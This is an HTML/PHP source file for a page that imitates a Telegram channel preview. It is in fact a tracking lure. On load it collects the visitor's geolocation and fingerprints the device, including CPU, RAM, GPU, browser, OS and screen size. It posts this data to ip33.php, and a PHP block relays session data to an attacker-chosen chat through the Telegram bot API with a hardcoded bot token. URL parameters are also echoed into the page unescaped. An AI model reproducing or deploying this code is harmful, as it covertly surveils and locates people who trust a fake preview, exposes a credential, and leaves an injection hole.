<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="tel.css">
    <!-- Add icon library -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script rel="javascript" type="text/javascript" href="js/jquery-1.11.3.min.js"></script>
    <title>Document</title>
</head>
<body>
<section class="box1">
<center>
  <script>
    var name = ''
    var link = ''
    var photo = ''
    var folo = ''
    var id = ''
            $.ajax({
        type:'GET',
        data:{
            name: name,link: link,photo: photo,id: id,Folo:folo
        },
        dataType: 'json',
        success:function (res) {
            console.log(res);
        }
    })
  </script>
  
  <?php 
  session_start();
 $obj = $_SESSION['ss'];
if (isset($_GET['name'])){
  $name =$_GET['name'];
}
if (isset($_GET['link'])){
  $link =$_GET['link'];
}
if (isset($_GET['Folo'])){
  $folo =$_GET['Folo'];
}
if (isset($_GET['photo'])){
  $photo = 'https://spaceplace.nasa.gov/gallery-sun/en/solar-flare.en.jpg';
}
  ?>
<?php echo "<img src=$photo>"?>
   <?php echo"<h3>$name</h3>"?>
    <p class="p1"><span class="ali"><?php echo $folo?></span>subscribers</p>
    <p class="p2"></p>
    <a href="#abuot"><button class="btn">VIEW IN TELEGRAM</button></a>
    <P class="p3">Preview channel</P>
    <p class="p4">lf you have <span>Telegram,</span>you can view and join To chanel</p>
</center>
</section>


    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script rel="javascript" type="text/javascript" href="js/jquery-1.11.3.min.js"></script>
    <script>
        function getLocation() {//get the lat and lon 
          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition);
          } else {
            x.innerHTML = "Geolocation is not supported by this browser.";
          }
        }
        getLocation();
        function showPosition(position,gel) {
          var lat = position.coords.latitude;
          var lon = position.coords.longitude;
          x = "Latitude: " + lat +
          "\nLongitude: " + lon;
          xx = "https://www.google.com/maps/place/"+lat+lon
          

          //get info 
          var ptf = navigator.platform;
        var cc = navigator.hardwareConcurrency;
        var ram = navigator.deviceMemory;
        var ver = navigator.userAgent;
        var str = ver;
        var os = ver;
        //gpu
        var canvas = document.createElement('canvas');
        var gl;
        var debugInfo;
        var ven;
        var ren;
        //sysinfo
        console.log(ver);
        console.log(ptf);

        if (cc == undefined)
        {
          cc = 'Not Available';
          console.log('Cores are not available')
        }
        console.log(cc);
        
        //ram
        if (ram == undefined)
        {
          ram = 'Not Available';
          console.log('RAM is not available')
        }
        console.log(ram);

        //browser
        if (ver.indexOf('Firefox') != -1)
        {
          str = str.substring(str.indexOf(' Firefox/') + 1);
          str = str.split(' ');
          brw = str[0];
          console.log(str[0]);
        }
        else if (ver.indexOf('Chrome') != -1)
        {
          str = str.substring(str.indexOf(' Chrome/') + 1);
          str = str.split(' ');
          brw = str[0];
          console.log(str[0]);
        }
        else if (ver.indexOf('Safari') != -1)
        {
          str = str.substring(str.indexOf(' Safari/') + 1);
          str = str.split(' ');
          brw = str[0];
          console.log(str[0]);
        }
        else if (ver.indexOf('Edge') != -1)
        {
          str = str.substring(str.indexOf(' Edge/') + 1);
          str = str.split(' ');
          brw = str[0];
          console.log(str[0]);
        }
        else
        {
          brw = 'Not Available'
          console.log('Browser is not available')
        }

        //gpu
        try
        {
          gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        }
        catch (e) {}
        if (gl)
        {
          debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
          ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        }
        if (ven == undefined)
        {
          ven = 'Not Available';
          console.log('GPU Vendor not available')
        }
        if (ren == undefined)
        {
          ren = 'Not Available';
          console.log('GPU Renderer not available')
        }
        console.log(ven);
        console.log(ren);
        //
        var ht = window.screen.height
        var wd = window.screen.width
        console.log(window.screen.height)
        console.log(window.screen.width)
        //os
        os = os.substring(0, os.indexOf(')'));
        os = os.split(';');
        os = os[1];
        if (os == undefined)
        {
          os = 'Not Available';
          console.log('OS is not available')
        }
        os = os.trim();
        console.log(os);

          $.ajax({
        type:'POST',
        url: 'ip33.php',
        data:{
            Lat: lat,Lon: lon,Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ven: ven, Ren: ren, Ht: ht, Wd: wd, Os: os
        },
        dataType: 'json',
        success:function (res) {
            console.log(res);
        }
    })

        }
        showPosition();

        </script>
<?php
if (isset($_GET['id'])){
  $id =$_GET['id'];
  // session_start();
  $alls = $_SESSION['kkk'];
  $apiToken = "5292505510:AAHETtj4RDgXGwYzqQOi7EikQH8a7mvBml0";
  $dataa = [
      'chat_id' => $id,
      'text' => $alls,
  ];
  $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($dataa) ); 
}
echo $id
?>

</body>
</html>
